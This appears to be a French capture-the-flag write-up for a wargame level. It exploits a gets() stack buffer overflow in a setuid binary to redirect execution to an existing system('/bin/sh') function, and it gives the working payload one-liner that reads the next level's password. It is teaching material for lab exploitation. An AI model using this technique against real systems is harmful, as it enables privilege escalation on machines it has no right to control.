# level1

## Objectif

Exploiter le binaire `level1` pour obtenir un shell `level2` et lire
`/home/user/level2/.pass`.

## 1. Repérer la faille

```sh
gdb ./level1
(gdb) disas main
```

```asm
0x08048480 <+0>:   push   %ebp
0x08048481 <+1>:   mov    %esp,%ebp
0x08048483 <+3>:   and    $0xfffffff0,%esp   ; alignement de la pile sur 16 octets
0x08048486 <+6>:   sub    $0x50,%esp         ; réserve 0x50 = 80 octets de locales
0x08048489 <+9>:   lea    0x10(%esp),%eax    ; eax = &buffer (esp+0x10)
0x0804848d <+13>:  mov    %eax,(%esp)        ; 1er argument = adresse du buffer
0x08048490 <+16>:  call   0x8048340 <gets@plt>  ; gets(buffer)
0x08048495 <+21>:  leave
0x08048496 <+22>:  ret
```

`main` réserve 80 octets (`sub $0x50`), place un buffer à
`esp+0x10`, puis appelle **`gets`**. `gets` lit l'entrée standard jusqu'au `\n`
**sans jamais vérifier la taille du buffer** → débordement de buffer sur la
pile. Comme le `ret` final saute vers l'adresse de retour stockée *au-dessus* du
buffer, un débordement suffisant permet de l'écraser et de contrôler le flux
d'exécution (registre EIP).

## 2. Trouver la fonction cible

```sh
(gdb) info functions
(gdb) disas run
```

```asm
0x08048444 <+0>:   push   %ebp
...
0x08048479 <+53>:  call   0x8048360 <system@plt>   ; system("/bin/sh")
```

La fonction `run` est **présente dans le binaire mais jamais
appelée** par `main`. Elle exécute `system(...)`, ce qui ouvre un shell ; le
binaire étant setuid `level2`, ce shell tournera avec les droits de `level2`.
Notre cible est le **début** de `run` : `0x08048444` (le `<+0>`, et non la ligne
du `call`, car les instructions précédentes préparent l'argument `"/bin/sh"`).

## 3. Mesurer l'offset jusqu'à l'adresse de retour

On envoie un motif où **chaque groupe de 4 caractères est unique**, pour pouvoir
identifier lequel atterrit sur l'adresse de retour :

```sh
(gdb) shell python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5"' > /tmp/exploit
(gdb) run < /tmp/exploit
(gdb) info registers eip     ; eip = 0x63413563
```

Il faut connaître le nombre exact d'octets entre le début du buffer et l'adresse
de retour. Au crash, `eip = 0x63413563`. On décode cette valeur en little-endian
(les octets sont rangés à l'envers en mémoire) :

```
octets      : 63 41 35 63   ->  c  A  5  c
ordre réel  : c  5  A  c    ->  sous-chaîne "c5Ac" du motif
```

La sous-chaîne `"c5Ac"` se trouve à la **position 76** du motif : le bloc `Ac5`
commence à l'indice 75, donc `c5Ac` démarre à l'indice 76. Ce sont donc les
octets 76 à 79 qui ont écrasé l'adresse de retour → **offset = 76**.

Vérification rapide avec un marqueur : `"a"*76 + "BBBB"` donne bien
`eip = 0x42424242` (les 4 `B` tombent exactement sur l'adresse de retour).

## 4. Construire le payload

```
[ "a" * 76 ][ adresse de run en little-endian ]
   remplissage        \x44\x84\x04\x08
```

Les 76 octets de remplissage comblent l'espace jusqu'à l'adresse de
retour ; les 4 octets suivants la remplacent. L'adresse s'écrit en little-endian
(à l'envers) : `0x08048444` → octets `08 04 84 44` → `\x44\x84\x04\x08`.

## 5. Exécuter et récupérer le flag

```sh
(python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

Détail de la commande :

- `python -c 'print "a"*76 + "\x44\x84\x04\x08"'` génère le payload (les 76
  octets de remplissage suivis de l'adresse de `run`).
- `; cat` enchaîne la commande `cat`, qui continue de lire le clavier.
- Les parenthèses `( … )` regroupent ces deux commandes pour que leurs sorties
  se suivent.
- `| ./level1` envoie le tout comme **entrée standard** de `./level1` : d'abord
  le payload (qui déclenche l'exploit), puis ce que `cat` transmet.

Sans le `cat`, l'entrée standard se fermerait juste après le payload et le shell
lancé par `run` se refermerait aussitôt. Le `cat` garde stdin ouvert pour te
laisser taper dans le shell obtenu.

```sh
whoami
cat /home/user/level2/.pass
```

Le mot de passe récupéré est à reporter dans le fichier `flag`.

## Nature de la faille

Débordement de buffer sur la pile (`gets` sans borne) permettant l'écrasement de
l'adresse de retour et le détournement de l'exécution vers une fonction
`system("/bin/sh")` déjà présente dans le binaire (technique *ret2* vers une
fonction existante).
